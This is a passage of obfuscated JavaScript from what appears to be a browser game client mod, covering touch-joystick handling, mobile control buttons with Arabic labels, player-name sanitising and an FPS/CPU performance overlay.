        let _0x19b866 = false;
        _0xc18ed6.addEventListener("touchstart", function (_0x707a37) {
          if (_0x707a37.touches.length > 0) {
            _0x1cec22 = true;
            if (_0x707a37.touches.length >= 2) {
              _0x332cc8 = true;
              _0x380234.og.af.An = true;
            }
            if (_0x707a37.touches.length === 1) {
              if ((_0x3d43b9 === 2 || _0x3d43b9 === 3) && vps.joystick && vps.joystick.mode === "dynamic") {
                _0x41a7de = _0x707a37.touches[0].clientX;
                _0x46892e = _0x707a37.touches[0].clientY;
              } else {
                _0x41a7de = window.innerWidth * 0.5;
                _0x46892e = window.innerHeight * 0.5;
              }
              const _0x3d1999 = _0x3d43b9 === 1 ? "img_p_1" : _0x3d43b9 === 2 ? "img_p_2" : _0x3d43b9 === 3 ? "img_p_3" : _0x3d43b9 === 4 ? "img_p_4" : _0x3d43b9 === 5 ? "img_p_5" : "img_p_1";
              const _0x59cd1f = document.getElementById(_0x3d1999);
              if (_0x59cd1f && !_0x19b866) {
                _0x59cd1f.style.opacity = "1";
                _0x59cd1f.style.left = _0x41a7de - 8 + "px";
                _0x59cd1f.style.top = _0x46892e - 8 + "px";
                _0x19b866 = true;
              }
            }
            if (_0x707a37.touches.length === 1 && (_0x3d43b9 === 2 || _0x3d43b9 === 3)) {
              const _0x1606f6 = document.getElementById("img_i_" + _0x3d43b9);
              const _0x370b81 = document.getElementById("img_o_" + _0x3d43b9);
              if (vps.joystick && vps.joystick.mode === "dynamic") {
                const _0x34624a = _0x707a37.touches[0];
                const _0x33f5fc = _0x34624a.clientX - 50;
                const _0x4015eb = _0x34624a.clientY - 50;
                window.dynamicJoystickCenter = {
                  x: _0x34624a.clientX,
                  y: _0x34624a.clientY
                };
                if (_0x370b81) {
                  _0x370b81.style.left = _0x33f5fc + "px";
                  _0x370b81.style.top = _0x4015eb + "px";
                  _0x370b81.style.opacity = "1";
                }
                if (_0x1606f6) {
                  _0x1606f6.style.left = _0x33f5fc + 25 + "px";
                  _0x1606f6.style.top = _0x4015eb + 25 + "px";
                  _0x1606f6.style.opacity = "1";
                }
              } else {
                if (_0x1606f6) {
                  _0x1606f6.style.opacity = "1";
                  _0x1606f6.style.left = _0x41a7de - 25 + "px";
                  _0x1606f6.style.top = _0x46892e - 25 + "px";
                }
                if (_0x370b81) {
                  _0x370b81.style.opacity = "1";
                }
              }
            }
            _0x707a37.preventDefault();
          }
        }, {
          passive: false
        });
        _0xc18ed6.addEventListener("touchmove", function (_0x566b89) {
          if (_0x1cec22 && _0x566b89.touches.length > 0) {
            if (_0x566b89.touches.length >= 2 && !_0x332cc8) {
              _0x332cc8 = true;
              _0x380234.og.af.An = true;
            } else if (_0x566b89.touches.length < 2 && _0x332cc8) {
              _0x332cc8 = false;
              _0x380234.og.af.An = false;
            }
            const _0x47ca61 = _0x566b89.touches[0];
            const _0x5013ef = _0x47ca61.clientX - _0x41a7de;
            const _0x2189bc = _0x47ca61.clientY - _0x46892e;
            const _0x3443b2 = Math.sqrt(_0x5013ef * _0x5013ef + _0x2189bc * _0x2189bc);
            const _0x5d1523 = Math.atan2(_0x2189bc, _0x5013ef);
            const _0x1b73a8 = Math.atan2(_0x2189bc, _0x5013ef);
            _0x380234.og.af.Bn = _0x1b73a8;
            const _0x5e884a = 45;
            const _0x1a7b07 = Math.min(_0x3443b2, _0x5e884a);
            const _0x21efc2 = 180;
            const _0x3dd233 = Math.min(_0x3443b2, _0x21efc2);
            if (_0x3443b2 > 5) {
              const _0x2616fa = _0x3d43b9 === 1 ? "img_p_1" : _0x3d43b9 === 2 ? "img_p_2" : _0x3d43b9 === 3 ? "img_p_3" : _0x3d43b9 === 4 ? "img_p_4" : _0x3d43b9 === 5 ? "img_p_5" : "img_p_1";
              const _0x3d2577 = document.getElementById(_0x2616fa);
              if (_0x3d2577) {
                const _0x145b39 = window.innerWidth / 2;
                const _0x58b7d6 = window.innerHeight / 2;
                const _0x50f697 = Math.cos(_0x5d1523) * _0x3dd233;
                const _0x5a4954 = Math.sin(_0x5d1523) * _0x3dd233;
                _0x3d2577.style.left = _0x145b39 + _0x50f697 - 8 + "px";
                _0x3d2577.style.top = _0x58b7d6 + _0x5a4954 - 8 + "px";
                _0x3d2577.style.opacity = "1";
              }
            }
            if (_0x3d43b9 === 2 || _0x3d43b9 === 3) {
              const _0x1651d6 = document.getElementById("img_i_" + _0x3d43b9);
              if (_0x1651d6) {
                if (vps.joystick && vps.joystick.mode === "dynamic" && window.dynamicJoystickCenter) {
                  const _0xce1f30 = _0x566b89.touches[0];
                  const _0x1d0510 = window.dynamicJoystickCenter.x;
                  const _0x5abb2f = window.dynamicJoystickCenter.y;
                  const _0x7a6e51 = _0xce1f30.clientX - _0x1d0510;
                  const _0x22402b = _0xce1f30.clientY - _0x5abb2f;
                  const _0x1437e1 = Math.sqrt(_0x7a6e51 * _0x7a6e51 + _0x22402b * _0x22402b);
                  const _0xcc6d14 = 40;
                  let _0x29d00b = _0x7a6e51;
                  let _0x3b0526 = _0x22402b;
                  if (_0x1437e1 > _0xcc6d14) {
                    const _0x36dc39 = _0xcc6d14 / _0x1437e1;
                    _0x29d00b = _0x7a6e51 * _0x36dc39;
                    _0x3b0526 = _0x22402b * _0x36dc39;
                  }
                  _0x1651d6.style.left = _0x1d0510 + _0x29d00b - 25 + "px";
                  _0x1651d6.style.top = _0x5abb2f + _0x3b0526 - 25 + "px";
                  _0x1651d6.style.opacity = "1";
                } else {
                  const _0x3ab030 = 95;
                  const _0x35d29e = window.innerHeight - 180 + 50;
                  const _0x52c107 = _0x566b89.touches[0];
                  const _0x700899 = _0x52c107.clientX - _0x3ab030;
                  const _0x3484c6 = _0x52c107.clientY - _0x35d29e;
                  const _0x1c70ac = Math.sqrt(_0x700899 * _0x700899 + _0x3484c6 * _0x3484c6);
                  const _0x628c9a = 40;
                  let _0x1e20d0 = _0x700899;
                  let _0x4d638e = _0x3484c6;
                  if (_0x1c70ac > _0x628c9a) {
                    const _0x176fa3 = _0x628c9a / _0x1c70ac;
                    _0x1e20d0 = _0x700899 * _0x176fa3;
                    _0x4d638e = _0x3484c6 * _0x176fa3;
                  }
                  _0x1651d6.style.left = _0x3ab030 + _0x1e20d0 - 25 + "px";
                  _0x1651d6.style.top = _0x35d29e + _0x4d638e - 25 + "px";
                  _0x1651d6.style.opacity = "1";
                }
              }
            }
            _0x566b89.preventDefault();
          }
        }, {
          passive: false
        });
        _0xc18ed6.addEventListener("touchend", function (_0x502f30) {
          if (_0x1cec22) {
            if (_0x502f30.touches.length < 2) {
              _0x332cc8 = false;
              _0x380234.og.af.An = false;
            }
            if (_0x502f30.touches.length === 0) {
              _0x1cec22 = false;
              _0x19b866 = false;
              const _0x558d37 = _0x3d43b9 === 1 ? "img_p_1" : _0x3d43b9 === 2 ? "img_p_2" : _0x3d43b9 === 3 ? "img_p_3" : _0x3d43b9 === 4 ? "img_p_4" : _0x3d43b9 === 5 ? "img_p_5" : "img_p_1";
              const _0x4bbf25 = document.getElementById(_0x558d37);
              if (_0x4bbf25) {
                _0x4bbf25.style.opacity = "0.25";
                const _0x26fccb = window.innerWidth;
                const _0x35ecd8 = window.innerHeight;
                if ((_0x3d43b9 === 2 || _0x3d43b9 === 3) && vps.joystick && vps.joystick.mode === "dynamic") {
                  _0x4bbf25.style.opacity = "0";
                } else {
                  _0x4bbf25.style.left = _0x26fccb * 0.5 - 8 + "px";
                  _0x4bbf25.style.top = _0x35ecd8 * 0.5 - 8 + "px";
                }
              }
              if (_0x3d43b9 === 2 || _0x3d43b9 === 3) {
                const _0x30babb = document.getElementById("img_i_" + _0x3d43b9);
                if (_0x30babb) {
                  if (vps.joystick && vps.joystick.mode === "dynamic" && window.dynamicJoystickCenter) {
                    _0x30babb.style.opacity = "0.25";
                    _0x30babb.style.left = window.dynamicJoystickCenter.x - 25 + "px";
                    _0x30babb.style.top = window.dynamicJoystickCenter.y - 25 + "px";
                  } else {
                    _0x30babb.style.opacity = "0.25";
                    const _0x1bac83 = 95;
                    const _0x29f3e1 = window.innerHeight - 180 + 50;
                    _0x30babb.style.left = _0x1bac83 - 25 + "px";
                    _0x30babb.style.top = _0x29f3e1 - 25 + "px";
                  }
                }
              }
            }
          }
        }, {
          passive: false
        });
        if (_0x3d43b9 === 4 || _0x3d43b9 === 5) {
          const _0x74c3f6 = document.getElementById("img_f");
          if (_0x74c3f6) {
            _0x74c3f6.style.pointerEvents = "auto";
            _0x74c3f6.style.cursor = "pointer";
            _0x74c3f6.style.opacity = "0.7";
            _0x74c3f6.addEventListener("touchstart", function (_0x51dffb) {
              _0x380234.og.af.An = true;
              _0x332cc8 = true;
              _0x74c3f6.style.opacity = "1";
              _0x74c3f6.style.transform = "scale(0.95)";
              const _0x2cdcfc = _0x3d43b9 === 4 ? "img_p_4" : "img_p_5";
              const _0x133019 = document.getElementById(_0x2cdcfc);
              const _0xc4e781 = document.getElementById("img_pf_1");
              if (_0x133019) {
                _0x133019.style.display = "none";
              }
              if (_0xc4e781) {
                _0xc4e781.style.display = "block";
                _0xc4e781.style.opacity = "1";
              }
              _0x51dffb.stopPropagation();
              _0x51dffb.preventDefault();
            }, {
              passive: false
            });
            _0x74c3f6.addEventListener("touchend", function (_0x3bb881) {
              _0x380234.og.af.An = false;
              _0x332cc8 = false;
              _0x74c3f6.style.opacity = "0.7";
              _0x74c3f6.style.transform = "scale(1)";
              const _0x37090a = _0x3d43b9 === 4 ? "img_p_4" : "img_p_5";
              const _0x12e489 = document.getElementById(_0x37090a);
              const _0x1a2586 = document.getElementById("img_pf_1");
              if (_0x12e489) {
                _0x12e489.style.display = "block";
              }
              if (_0x1a2586) {
                _0x1a2586.style.display = "none";
              }
              _0x3bb881.stopPropagation();
              _0x3bb881.preventDefault();
            }, {
              passive: false
            });
            _0x74c3f6.addEventListener("mousedown", function (_0x59d16a) {
              _0x380234.og.af.An = true;
              _0x332cc8 = true;
              _0x74c3f6.style.opacity = "1";
              _0x74c3f6.style.transform = "scale(0.95)";
              _0x59d16a.stopPropagation();
              _0x59d16a.preventDefault();
            });
            _0x74c3f6.addEventListener("mouseup", function (_0x21281f) {
              _0x380234.og.af.An = false;
              _0x332cc8 = false;
              _0x74c3f6.style.opacity = "0.7";
              _0x74c3f6.style.transform = "scale(1)";
              _0x21281f.stopPropagation();
              _0x21281f.preventDefault();
            });
          }
        }
      };
      if (_wup.ismobile) {
        var _0x526667 = "";
        Object.keys(vps.configJoystick.buttons).forEach(function (_0x37a4ba) {
          var _0x472a09;
          var _0x20f46f;
          var _0x1632a4 = vps.configJoystick.buttons[_0x37a4ba].action;
          if (_0x37a4ba === "respawn") {
            _0x472a09 = "<img src=\"" + atob(savedImages[87]) + "\" style=\"object-fit:contain;\">";
            _0x20f46f = "background:transparent;border:none;padding:0;cursor:pointer;display:flex;justify-content:center;align-items:center;";
          } else if (_0x37a4ba === "lobby") {
            _0x472a09 = "<img src=\"" + atob(savedImages[88]) + "\" style=\"object-fit:contain;\">";
            _0x20f46f = "background:transparent;border:none;padding:0;cursor:pointer;display:flex;justify-content:center;align-items:center;";
          } else if (_0x37a4ba === "swap") {
            _0x472a09 = "<img src=\"" + atob(savedImages[89]) + "\" style=\"object-fit:contain;\">";
            _0x20f46f = "background:transparent;border:none;padding:0;cursor:pointer;display:flex;justify-content:center;align-items:center;";
          } else if (_0x37a4ba === "rotate") {
            _0x472a09 = "<img src=\"" + atob(savedImages[0]) + "\" style=\"object-fit:contain;\">";
            _0x20f46f = "background:transparent;border:none;padding:0;cursor:pointer;display:flex;justify-content:center;align-items:center;";
          } else if (_0x37a4ba === "snail") {
            _0x472a09 = "<img src=\"" + atob(savedImages[2]) + "\" style=\"object-fit:contain;\">";
            _0x20f46f = "background:transparent;border:none;padding:0;cursor:pointer;display:flex;justify-content:center;align-items:center;";
          } else if (_0x37a4ba === "laser") {
            _0x472a09 = "<img src=\"" + atob(savedImages[85]) + "\" style=\"object-fit:contain;\">";
            _0x20f46f = "background:transparent;border:none;padding:0;cursor:pointer;display:flex;justify-content:center;align-items:center;";
          } else if (_0x37a4ba === "zoom") {
            _0x472a09 = "<img src=\"" + atob(savedImages[4]) + "\" style=\"object-fit:contain;\">";
            _0x20f46f = "background:transparent;border:none;padding:0;cursor:pointer;display:flex;justify-content:center;align-items:center;";
          } else if (_0x37a4ba === "zoomplus") {
            _0x472a09 = "<img src=\"" + atob(savedImages[7]) + "\" style=\"object-fit:contain;\">";
            _0x20f46f = "background:transparent;border:none;padding:0;cursor:pointer;display:flex;justify-content:center;align-items:center;";
          } else if (_0x37a4ba === "zoomminus") {
            _0x472a09 = "<img src=\"" + atob(savedImages[6]) + "\" style=\"object-fit:contain;\">";
            _0x20f46f = "background:transparent;border:none;padding:0;cursor:pointer;display:flex;justify-content:center;align-items:center;";
          } else {}
          _0x526667 = _0x526667 + (vps.configJoystick.buttons[_0x37a4ba].active ? "<button onclick=\"" + _0x1632a4 + "\" id=\"gtr_" + _0x37a4ba + "\" style=\"" + _0x20f46f + "\">" + _0x472a09 + "</button>" : "");
        });
        var _0x3d8189 = "\n        <style>\n          #up-mobile-box {\n            position: fixed;z-index: 1001;width: 100%;top: 10px;\n            pointer-events: none;\n            transform: translateX(0px) !important;\n          }\n          \n          @media screen and (orientation: portrait) {\n            #up-mobile-box {\n              transform: translateX(0px) !important;\n            }\n          }\n          \n          @media screen and (orientation: landscape) {\n            #up-mobile-box {\n              transform: translateX(0px) !important;\n            }\n          }\n        #up-mobile-buttons {\n          position: relative;\n          margin: 0 auto;\n          width: fit-content;\n          min-width: 50px;\n          max-width: 350px;\n          display: flex;\n          flex-wrap: nowrap;\n          justify-content: center;\n          align-items: center;\n          pointer-events: auto;\n          gap: 8px;\n          transform: translateX(0px);\n          padding: 5px 10px;\n          transition: width 0.3s ease;\n        }\n          #up-mobile-buttons > button {\n            transition: transform 0.1s, opacity 0.2s;\n            opacity: 0.25;\n            outline: none;\n            -webkit-tap-highlight-color: transparent;\n          }\n            #up-mobile-buttons > button:active {\n                transform: scale(1.1);\n                opacity: 1;\n                outline: none;\n              }\n              \n              #up-mobile-buttons > button:hover {\n                transform: scale(1.05);\n                opacity: 0.8;\n              }\n              \n              #up-mobile-buttons > button {\n                transition: transform 0.15s ease, opacity 0.2s ease;\n                opacity: 0.25;\n                outline: none;\n                -webkit-tap-highlight-color: transparent;\n              }\n          #up-mobile-buttons > button:focus {\n            outline: none;\n          }\n          #up-mobile-buttons > button.active {\n            opacity: 1;\n          }\n          #up-mobile-buttons > button img {\n            pointer-events: none;\n          }\n        .game-slider-container-02 {\n           position: fixed;\n           z-index: 1000;\n           bottom: 50px;\n           right: 10px;\n           pointer-events: auto !important;\n           z-index: 9999 !important;\n        }\n        .game-slider-container-02 input[type=range][orient=vertical] {\n           writing-mode: vertical-lr;\n           direction: rtl;\n           appearance: slider-vertical;\n           width: 16px;\n           vertical-align: bottom;\n           pointer-events: auto !important;\n           z-index: 9999 !important;\n           filter: hue-rotate(190deg) saturate(1.8) brightness(1.3);\n           opacity: 0.3;\n           transition: opacity 0.3s ease;\n        }\n        .game-slider-container-02 input[type=range][orient=vertical]::-webkit-slider-thumb {\n           transform: scale(1.8);\n        }\n        .game-slider-container-02 input[type=range][orient=vertical]::-moz-range-thumb {\n           transform: scale(1.8);\n        }\n        .game-slider-container-02 input[type=range][orient=vertical]:hover,\n        .game-slider-container-02 input[type=range][orient=vertical]:focus {\n           opacity: 0.65;\n        }\n        .game-slider-container-02 input[type=range][orient=vertical]:hover::-webkit-slider-thumb,\n        .game-slider-container-02 input[type=range][orient=vertical]:focus::-webkit-slider-thumb {\n           transform: scale(2.2);\n        }\n          \n        \n          \n          #joystick-switch-btn:active {\n            transform: translateX(-50%) scale(0.95);\n            background: rgba(0,0,0,0.9);\n          }\n          \n          #joystick-switch-btn img {\n            width: 30px;\n            height: 15px;\n            object-fit: contain;\n            pointer-events: none;\n          }\n          \n          #joystick-type-label {\n            position: fixed;\n            bottom: 90px;\n            left: 50%;\n            transform: translateX(-50%);\n            color: #fff;\n            font-size: 9px;\n            text-align: center;\n            text-shadow: 1px 1px 2px rgba(0,0,0,0.8);\n            z-index: 1002;\n            pointer-events: none;\n            background: rgba(0,0,0,0.5);\n            padding: 2px 8px;\n            border-radius: 10px;\n          }\n          \n          @media screen and (orientation: portrait) {\n            #joystick-switch-btn {\n              bottom: 150px !important;\n            }\n            #joystick-type-label {\n              bottom: 120px !important;\n            }\n          }\n          \n          @media screen and (orientation: landscape) {\n            #joystick-switch-btn {\n              bottom: 100px !important;\n            }\n            #joystick-type-label {\n              bottom: 70px !important;\n            }\n          }\n          \n          #joystick-switch-btn img {\n            width: 35px;\n            height: 18px;\n            object-fit: contain;\n          }\n          \n          #joystick-type-label {\n            position: fixed;\n            bottom: 150px;\n            left: 50%;\n            transform: translateX(-50%);\n            color: #fff;\n            font-size: 10px;\n            text-align: center;\n            text-shadow: 1px 1px 2px rgba(0,0,0,0.8);\n            z-index: 1002;\n            pointer-events: none;\n          }\n          \n          @media screen and (orientation: portrait) {\n            #joystick-switch-btn {\n              bottom: 220px !important;\n            }\n            #joystick-type-label {\n              bottom: 190px !important;\n            }\n          }\n        </style>\n        <div id=\"up-mobile-box\"><div id=\"up-mobile-buttons\">" + _0x526667 + "</div></div>\n        \n        >\n        ";
        _0x3d8189 = _0x3d8189 + (vps.configJoystick.typeCurrent === "btn" ? "" : "<div id=\"up-mobile-box-slider\" class=\"game-slider-container-02\"><input id=\"sliderZoom\" orient=\"vertical\" onchange=\"gtr.gtrass9(this)\" type=\"range\" min=\"0.25\" max=\"" + (_0x5f5546 ? 12 : 2) + "\" step=\"0.25\" value=\"1\" style=\"height: 65vh;\"></div>");
        $("body").append(_0x3d8189);
        gtr.updateJoystickSwitchButton = function () {
          const _0x533581 = {
            1: atob(savedImages[9]),
            2: atob(savedImages[10]),
            3: atob(savedImages[11]),
            4: atob(savedImages[12]),
            5: atob(savedImages[12]),
            6: atob(savedImages[9])
          };
          const _0x30fc50 = {
            1: "النوع 1",
            2: "النوع 2",
            3: "النوع 3",
            4: "النوع 4",
            5: "النوع 5",
            6: "النوع 6"
          };
          const _0x2345ff = document.getElementById("joystick-icon");
          const _0x118132 = document.getElementById("joystick-type-label");
          if (_0x2345ff) {
            _0x2345ff.src = _0x533581[vps.joystickType];
          }
          if (_0x118132) {
            _0x118132.textContent = _0x30fc50[vps.joystickType];
          }
        };
        setTimeout(function () {
          document.querySelectorAll("#up-mobile-buttons button").forEach(function (_0x1b3ff6) {
            var _0x2169f2 = _0x1b3ff6.getAttribute("onclick");
            _0x1b3ff6.removeAttribute("onclick");
            let _0x1fcbe4 = false;
            _0x1b3ff6.addEventListener("touchstart", function (_0x81e13) {
              _0x81e13.preventDefault();
              _0x81e13.stopPropagation();
              this.style.transform = "scale(1.15)";
              this.style.opacity = "1";
              if (_0x1fcbe4) {
                return;
              }
              _0x1fcbe4 = true;
              if (_0x2169f2) {
                try {
                  eval(_0x2169f2);
                } catch (_0x53e242) {
                  console.error("خطأ في تنفيذ الإجراء:", _0x53e242);
                }
              }
              setTimeout(() => {
                _0x1fcbe4 = false;
              }, 200);
            }, {
              passive: false
            });
            _0x1b3ff6.addEventListener("touchend", function (_0xa03c87) {
              _0xa03c87.preventDefault();
              _0xa03c87.stopPropagation();
              this.style.transform = "scale(1)";
              var _0x57707d = this.id;
              if (_0x57707d === "gtr_laser") {
                if (window.gtr?.gtr_laser === true) {
                  this.style.opacity = "1";
                } else {
                  this.style.opacity = "0.25";
                }
              } else if (_0x57707d === "gtr_rotate") {
                if (window.gtr?.gtr_rotate === true) {
                  this.style.opacity = "1";
                } else {
                  this.style.opacity = "0.25";
                }
              } else if (_0x57707d === "gtr_snail") {
                if (window.gtr?.gtr_snail === true) {
                  this.style.opacity = "1";
                } else {
                  this.style.opacity = "0.25";
                }
              } else {
                this.style.opacity = "0.25";
              }
            }, {
              passive: false
            });
            _0x1b3ff6.addEventListener("touchend", function (_0x10dd6f) {
              _0x10dd6f.preventDefault();
              _0x10dd6f.stopPropagation();
            }, {
              passive: false
            });
            _0x1b3ff6.addEventListener("touchstart", function (_0x53e18c) {
              _0x53e18c.stopPropagation();
            }, {
              passive: true
            });
            _0x1b3ff6.addEventListener("touchend", function (_0x5d9a54) {
              _0x5d9a54.stopPropagation();
            }, {
              passive: true
            });
          });
          var _0x19d6c3 = document.getElementById("gtr_laser");
          if (_0x19d6c3) {
            _0x19d6c3.addEventListener("click", function (_0x55e1b6) {
              _0x55e1b6.stopPropagation();
              setTimeout(() => {
                gtr.updateLaserButton();
              }, 10);
            });
          }
          var _0x15a96c = document.getElementById("gtr_snail");
          if (_0x15a96c) {
            _0x15a96c.addEventListener("click", function (_0x351e0d) {
              _0x351e0d.stopPropagation();
              setTimeout(() => {
                var _0x27b84d = this.querySelector("img");
                if (_0x27b84d && window.gtr) {
                  if (window.gtr.gtr_snail === true) {
                    _0x27b84d.src = atob(savedImages[3]);
                    this.style.opacity = "1";
                  } else {
                    _0x27b84d.src = atob(savedImages[2]);
                    this.style.opacity = "0.25";
                  }
                }
              }, 150);
            });
          }
          var _0x21d52f = document.getElementById("gtr_zoom");
          if (_0x21d52f) {
            _0x21d52f.addEventListener("click", function (_0x4e6e55) {
              _0x4e6e55.stopPropagation();
              setTimeout(() => {
                var _0xeb703d = this.querySelector("img");
              }, 150);
            });
          }
        }, 1000);
      }
      if (_wup.ismobile && vps.joystick.checked) {
        _0x2029a5();
      }
    } catch (_0x39be38) {
      console.error(_0x39be38);
    }
  };
  function _0x1180ad(_0x32dd7d) {
    if (!_0x32dd7d || typeof _0x32dd7d !== "string") {
      return "";
    }
    _0x32dd7d = _0x32dd7d.replace(/_[a-zA-Z]{1,2}_.*$/i, "");
    _0x32dd7d = _0x32dd7d.replace(/_A.*$/i, "");
    _0x32dd7d = _0x32dd7d.replace(/__.*$/, "");
    _0x32dd7d = _0x32dd7d.replaceAll("_", " ");
    _0x32dd7d = _0x32dd7d.replace(/[\u0000-\u001F\u007F-\u009F]/g, "");
    _0x32dd7d = _0x32dd7d.replace(/\uFDFD/g, "");
    _0x32dd7d = _0x32dd7d.replace(/[\u064B-\u065F\u0640\u06D4]/g, "");
    _0x32dd7d = _0x32dd7d.replace(/\d{4,}/g, " ");
    _0x32dd7d = _0x32dd7d.replace(/[_\-\*\+\=\{\}\[\]]{3,}/g, " ");
    _0x32dd7d = _0x32dd7d.replace(/\s+/g, " ");
    _0x32dd7d = _0x32dd7d.replace(/^[\.\-\s]+|[\.\-\s]+$/g, "");
    if (_0x32dd7d.length > 15) {
      _0x32dd7d = _0x32dd7d.substring(0, 15);
      _0x32dd7d = _0x32dd7d.replace(/[\uD800-\uDBFF]$/, "");
    }
    return _0x32dd7d.trim();
  }
  window.PerformanceMonitor = {
    lastTime: performance.now(),
    frameCount: 0,
    fps: 0,
    cpuUsage: 0,
    fpsDisplay: null,
    cpuDisplay: null,
    isFpsVisible: false,
    isCpuVisible: false,
    cpuSamples: [],
    cpuSampleSize: 10,
    lastCpuTime: 0,
    isInitialized: false,
    _cpuMonitoringInterval: null,
    _animFrameId: null,
    init() {
      if (this.isInitialized) {
        return;
      }
      this.isInitialized = true;
      let _0x2fde8c = false;
      if (typeof vps !== "undefined" && vps.performanceMonitorEnabled !== undefined) {
        _0x2fde8c = vps.performanceMonitorEnabled;
      } else {
        const _0x49c0f4 = localStorage.getItem("showFpsCpu");
        if (_0x49c0f4 !== null) {
          _0x2fde8c = _0x49c0f4 === "true";
        }
      }
      this.isFpsVisible = _0x2fde8c;
      this.isCpuVisible = _0x2fde8c;
      this.createDisplayElements();
      if (this.isFpsVisible || this.isCpuVisible) {
        this.startAllMonitoring();
      }
      this.setupKeyboardControls();
      this.updateDisplays();
      this.setupToggleButton();
    },
    startAllMonitoring() {
      if (this.isFpsVisible && !this._animFrameId) {
        this.startMonitoring();
      }
      if (this.isCpuVisible && !this._cpuMonitoringInterval) {
        this.startCpuMonitoring();
      }
    },
    stopAllMonitoring() {
      if (this._cpuMonitoringInterval) {
        clearInterval(this._cpuMonitoringInterval);
        this._cpuMonitoringInterval = null;
      }
      if (this._animFrameId) {
        cancelAnimationFrame(this._animFrameId);
        this._animFrameId = null;
      }
    },
    setupToggleButton() {
      const _0x1e6dd6 = document.getElementById("performance-monitor-toggle");
      if (_0x1e6dd6) {
        _0x1e6dd6.checked = this.isFpsVisible || this.isCpuVisible;
        _0x1e6dd6.addEventListener("change", () => {
          const _0x11a558 = _0x1e6dd6.checked;
          this.toggle(_0x11a558);
        });
      } else {
        setTimeout(() => {
          const _0x488c23 = document.getElementById("performance-monitor-toggle");
          if (_0x488c23) {
            _0x488c23.checked = this.isFpsVisible || this.isCpuVisible;
            _0x488c23.addEventListener("change", () => {
              this.toggle(_0x488c23.checked);
            });
          }
        }, 1000);
      }
    },
    createDisplayElements() {
      const _0x184793 = document.getElementById("performance-monitor-style");
      if (!_0x184793) {
        const _0x33cd3b = document.createElement("style");
        _0x33cd3b.id = "performance-monitor-style";
        _0x33cd3b.textContent = "\n                        .performance-monitor-container {\n                            position: fixed;\n                            right: 5px;\n                            bottom: 5px;\n                            display: flex;\n                            gap: 5px;\n                            z-index: 9999;\n                            font-family: Arial, sans-serif;\n                            pointer-events: none;\n                            user-select: none;\n                        }\n                        .monitor-element {\n                            background-color: rgba(0, 0, 0, 0.5);\n                            font-size: 12px;\n                            height: 20px;\n                            line-height: 20px;\n                            border-radius: 4px;\n                            font-weight: bold;\n                            text-shadow: 1px 1px 2px rgba(0,0,0,0.5);\n                            padding: 0 8px;\n                            white-space: nowrap;\n                            box-sizing: border-box;\n                            display: none;\n                        }\n                    ";
        document.head.appendChild(_0x33cd3b);
      }
      let _0x35b260 = document.querySelector(".performance-monitor-container");
      if (!_0x35b260) {
        _0x35b260 = document.createElement("div");
        _0x35b260.className = "performance-monitor-container";
        document.body.appendChild(_0x35b260);
      }
      if (!this.fpsDisplay) {
        this.fpsDisplay = document.createElement("div");
        this.fpsDisplay.className = "monitor-element";
        _0x35b260.appendChild(this.fpsDisplay);
      }
      if (!this.cpuDisplay) {
        this.cpuDisplay = document.createElement("div");
        this.cpuDisplay.className = "monitor-element";
        _0x35b260.appendChild(this.cpuDisplay);
      }
    },
    startCpuMonitoring() {
      if (!this.isCpuVisible) {
        return;
      }
      if (this._cpuMonitoringInterval) {
        clearInterval(this._cpuMonitoringInterval);
      }
      this.lastCpuTime = performance.now();
      this.cpuSamples = [];
      this._cpuMonitoringInterval = setInterval(() => {
        if (!this.isCpuVisible) {
          clearInterval(this._cpuMonitoringInterval);
          this._cpuMonitoringInterval = null;
          return;
        }
        this.measureCpuUsage();
      }, 500);
      if (window.gameIntervals) {
        window.gameIntervals.push(this._cpuMonitoringInterval);
      }
    },
    measureCpuUsage() {
      const _0x3e0c84 = performance.now();
      const _0x3ee41b = _0x3e0c84 - this.lastCpuTime;
      const _0x376454 = 60;
      const _0x1a9835 = Math.max(0, _0x376454 - this.fps) / _0x376454;
      let _0x20b66c = 0;
      if (window.performance && window.performance.timing) {
        const _0x5c3cf2 = window.performance.timing;
        _0x20b66c = _0x5c3cf2.domComplete - _0x5c3cf2.navigationStart;
      }
      const _0xaa1290 = Math.min(1, window.anApp ? 0.7 : 0.3);
      const _0x4e6ec9 = Math.min(100, Math.round((_0x1a9835 * 70 + _0x20b66c / 1000 * 30) * _0xaa1290));
      this.cpuSamples.push(_0x4e6ec9);
      if (this.cpuSamples.length > this.cpuSampleSize) {
        this.cpuSamples.shift();
      }
      this.cpuUsage = Math.round(this.cpuSamples.reduce((_0x3e8db2, _0x2b944b) => _0x3e8db2 + _0x2b944b, 0) / this.cpuSamples.length);
      this.lastCpuTime = _0x3e0c84;
      this.updateDisplays();
    },
    startMonitoring() {
      if (!this.isFpsVisible) {
        return;
      }
      if (this._animFrameId) {
        cancelAnimationFrame(this._animFrameId);
      }
      const _0x5c838d = () => {
        if (!this.isFpsVisible) {
          cancelAnimationFrame(this._animFrameId);
          this._animFrameId = null;
          return;
        }
        const _0x272749 = performance.now();
        const _0x313f44 = _0x272749 - this.lastTime;
        this.frameCount++;
        if (_0x313f44 >= 1000) {
          this.fps = Math.round(this.frameCount * 1000 / _0x313f44);
          this.frameCount = 0;
          this.lastTime = _0x272749;
          this.updateDisplays();
        }
        this._animFrameId = requestAnimationFrame(_0x5c838d);
      };
      this._animFrameId = requestAnimationFrame(_0x5c838d);
    },
    updateDisplays() {
      if (!this.fpsDisplay || !this.cpuDisplay) {
        return;
      }
      if (this.isFpsVisible) {
        this.fpsDisplay.textContent = "FPS: " + this.fps;
        if (this.fps >= 58) {
          this.fpsDisplay.style.color = "white";
        } else if (this.fps >= 30) {
          this.fpsDisplay.style.color = "gold";
        } else {
          this.fpsDisplay.style.color = "red";
        }
        this.fpsDisplay.style.display = "block";
      } else {
        this.fpsDisplay.style.display = "none";
      }
      if (this.isCpuVisible) {
        this.cpuDisplay.textContent = "CPU: " + this.cpuUsage + "%";
        if (this.cpuUsage <= 50) {
          this.cpuDisplay.style.color = "white";
        } else if (this.cpuUsage <= 80) {
          this.cpuDisplay.style.color = "gold";
        } else {
          this.cpuDisplay.style.color = "red";
        }
        this.cpuDisplay.style.display = "block";
      } else {
        this.cpuDisplay.style.display = "none";
      }
    },
    setupKeyboardControls() {
      if (this._hasSetupKeyboardControls) {
        return;
      }
      this._hasSetupKeyboardControls = true;
      document.addEventListener("keydown", _0x49e19d => {
        if (_0x49e19d.key === "F2" || _0x49e19d.code === "F2" || _0x49e19d.keyCode === 113) {
          _0x49e19d.preventDefault();
          this.isCpuVisible = !this.isCpuVisible;
          if (this.isCpuVisible && !this._cpuMonitoringInterval) {
            this.startCpuMonitoring();
          }
          this.saveSettings();
